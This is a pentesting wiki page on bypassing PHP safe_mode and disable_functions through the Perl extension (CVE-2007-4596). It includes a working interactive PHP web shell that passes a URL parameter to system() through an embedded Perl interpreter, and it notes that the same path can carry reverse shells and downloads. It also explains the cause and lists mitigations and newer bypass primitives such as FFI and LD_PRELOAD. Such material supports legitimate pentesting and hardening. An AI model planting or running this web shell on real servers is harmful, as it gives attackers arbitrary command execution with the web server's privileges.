# PHP **Perl** Extension `safe_mode` / `disable_functions` Bypass

{{#include ../../../../banners/hacktricks-training.md}}

## Overview 📝
The **Perl** PECL extension exposes a complete Perl interpreter to PHP.  In legacy
installations (mainly PHP ≤ 5.3) where the historical **`safe_mode`** directive — and
often `disable_functions` — is enforced, the **handler implemented by the extension
is **not** subject to those restrictions**.  Invoking

```php
$perl = new perl();
$perl->eval('system("id")');
```

spawns an external process even when every classical command-execution function
(`system`, `exec`, `shell_exec`, …) is disabled.

* 2007: This behaviour was assigned **CVE-2007-4596** and remained exploitable
  for years because the Perl extension never honoured `safe_mode` rules .
* 2012: Starting with **PHP 5.4** the whole `safe_mode` feature was completely
  removed by the core team .  Nevertheless, many legacy
  systems or CTF challenges still expose PHP 5.x with this extension loaded, so
  the technique can be useful during real-world pentests.

## Requirements
1. Target runs **PHP ≤ 5.3** *with* `safe_mode = On` **or** a modern PHP build
   where **`disable_functions`** blacklists every command-execution primitive.
2. The **`perl`** extension is loaded (confirm with `extension_loaded('perl')`).
3. Attacker is able to upload/execute arbitrary PHP code (web-shell, file
   inclusion, LFI/RFI + `php://input`, etc.).

## Proof-of-Concept (interactive web-shell)
The following one-liner automatically falls back to `dir`/`ls` according to the
OS and prints command output inside a `<textarea>` for convenience.  It is the
original NetJackal PoC slightly reformatted:

```php
<?php
if (!extension_loaded('perl')) die('[!] perl extension is not loaded');

if (!isset($_GET))    $_GET =& $HTTP_GET_VARS;
if (empty($_GET['cmd']))
    $_GET['cmd'] = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') ? 'dir' : 'ls';

$perl = new perl();
echo '<textarea rows="25" cols="75">';
$perl->eval("system('{$_GET['cmd']}')");
echo '</textarea>';
$_GET['cmd'] = htmlspecialchars($_GET['cmd']);

echo "<br><form>CMD: <input type=text name=cmd value='{$_GET['cmd']}' size=25></form>";
?>
```

> Tip ▶️  You can also trigger **non-interactive** payloads, e.g. reverse shells,
> file downloads, etc., because `system()` is executed by the embedded
> interpreter with the web-server’s privileges.

## Why does it work?
`disable_functions` only hooks the handlers stored inside the Zend
`function_table`.  The Perl extension registers **one single internal function
(`perl_eval`)** that, in turn, invokes the *external* Perl interpreter, so none
of the disabled PHP native functions are required.  The call chain never
queries the `function_table` again, and `safe_mode` checks are completely
skipped, producing **arbitrary command execution**.

## Mitigation
* **Remove the extension** (`extension=perl.so` / `php_perl.dll`) from `php.ini`.
* Upgrade to **PHP ≥ 5.4** (safe_mode removed) and rely on well-maintained
  sandboxing mechanisms such as **open_basedir**, **Suhosin**, containers or
  system mandatory access controls (AppArmor/SELinux).
* Isolate legacy applications that strictly require the Perl module inside a
  container without dangerous tools/binaries.

## Modern alternatives
The Perl trick is rarely available today.  If the module is missing, consult
`disable_functions`/`open_basedir` master page for newer primitives such as:

* **FFI** (`ffi.enable=1`, PHP ≥ 7.4) to directly call `libc` functions.
* **LD_PRELOAD** injection via `mail()`, `mb_send_mail()`, `Imagick`, etc.
* **PHP-FPM** or **FastCGI** escapes.

{{#ref}}
../README.md
{{#endref}}



## References
* National Vulnerability Database – CVE-2007-4596   
* PHP 5.4 ChangeLog – removal of safe_mode 
{{#include ../../../../banners/hacktricks-training.md}}
